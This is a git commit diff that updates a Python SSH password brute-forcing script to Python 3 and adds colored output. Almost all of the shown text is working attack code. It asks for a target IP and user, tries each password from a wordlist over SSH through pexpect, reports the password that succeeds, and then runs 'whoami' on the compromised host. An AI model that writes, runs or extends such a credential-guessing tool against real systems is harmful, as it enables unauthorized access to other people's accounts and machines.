32b01e089e6c7397ec29769df6ed28b44e5fdea3
Alelizzt <alejandrolistc@hotmail.com>
2019-09-12 16:54:18 -0500

    update brute-forcing script to python3 and add some colors

--- sshftp/brutessh.py
+++ sshftp/brutessh.py
@@ -1,8 +1,14 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import pexpect
+from termcolor import colored
 
 PROMPT = ['# ', '>>> ', '> ', '\$ ']
+
+def send_command(child,command):
+    child.sendline(command)
+    child.expect(PROMPT)
+    print(child.before)
 
 def connect(user,host,password):
     ssh_newkey = 'Are you sure you want to continue connecting'
@@ -10,13 +16,13 @@ def connect(user,host,password):
     child = pexpect.spawn(connStr)
     ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
     if ret == 0:
-        print '[-] Error connecting'
+        print('[-] Error connecting')
         return
     if ret == 1:
         child.sendline('yes')
         ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
         if ret == 0:
-            print '[-] Error connecting'
+            print('[-] Error connecting')
             return
     child.sendline(password)
     child.expect(PROMPT,timeout=0.5)
@@ -24,15 +30,16 @@ def connect(user,host,password):
 
 
 def main():
-    host = raw_input("Enter IP address to target to bruteforce: ")
-    user = raw_input("Enter user Account you want to bruteforce: ")
+    host = input("Enter IP address to target to bruteforce: ")
+    user = input("Enter user Account you want to bruteforce: ")
     file = open('passwords.txt','r')
     for password in file.readlines():
         password = password.strip('\n')
         try:
             child = connect(user, host, password)
-            print '[+] Password found: '+ password
+            print (colored('[+] Password found: '+ password, 'green'))
+            send_command(child,'whoami')
         except:
-            print '[-] Wrong password: '+password
+            print (colored('[-] Wrong password: '+password, 'red'))
     
 main()
